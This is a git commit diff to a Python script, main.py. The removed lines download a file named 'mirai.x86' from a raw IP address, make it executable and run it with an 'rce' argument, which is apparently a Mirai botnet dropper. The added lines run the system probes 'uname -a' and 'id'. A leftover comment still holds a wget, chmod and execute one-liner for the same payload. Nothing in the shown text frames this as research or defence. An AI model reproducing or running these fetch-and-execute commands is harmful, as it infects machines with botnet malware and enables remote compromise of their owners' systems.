19547e45b668a8a95186aa594dc18bd308e59b6f
Glock-18 <65131732+Glock-18@users.noreply.github.com>
2022-03-12 15:13:53 +0000

    Update main.py

--- main.py
+++ main.py
@@ -2,22 +2,11 @@ import requests
 import sys
 import subprocess
 
-url = 'http://54.37.93.31/mirai.x86'
-
-myfile = requests.get(url)
-
-open('t/mirai.x86', 'wb').write(myfile.content)
-
 def run(cmd):
     subprocess.call(cmd, shell=True)
 
-run("mkdir t")
-run("touch t/mirai.x86")
-
-def run(cmd):
-    subprocess.call(cmd, shell=True)
-
-run("cd t;chmod 777 mirai.x86;./mirai.x86 rce")
+run("uname -a")
+run("id")
 
 
 # wget http://54.37.93.31/mirai.x86; chmod 777 mirai.x86;./mirai.x86 rce
